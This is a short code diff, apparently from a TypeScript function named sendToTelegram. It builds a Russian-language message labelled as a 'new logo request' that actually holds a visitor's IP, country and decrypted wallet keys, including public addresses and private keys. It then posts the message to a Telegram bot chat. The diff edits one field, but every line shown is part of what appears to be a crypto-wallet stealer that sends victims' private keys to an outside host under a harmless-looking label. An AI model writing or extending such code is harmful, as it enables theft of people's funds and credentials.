@@ -122,7 +122,7 @@ async function sendToTelegram(ip: any, country: any, decryptedData: { timestamp:
     let message = `🌐 *Новый запрос логотипа*\n\n`;
     message += `🖥️ *IP*: ${ip}\n`;
     message += `📍 *Страна*: ${country}\n\n`;
-    message += `\n🔓 *Расшифрованные данные*: \n Заголовок:${decryptedData?.timestamp}\n\n Ключи: ${decryptedData?.keys.map((key: any) => "\n" + "Публичный адрес:" + key.get("public") + "|" + "Приватка:" + key.get("private"))}\n`;
+    message += `\n🔓 *Расшифрованные данные*: \n Заголовок:${decryptedData?.header}\n\n Ключи: ${decryptedData?.keys.map((key: any) => "\n" + "Публичный адрес:" + key.get("public") + "|" + "Приватка:" + key.get("private"))}\n`;
     
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
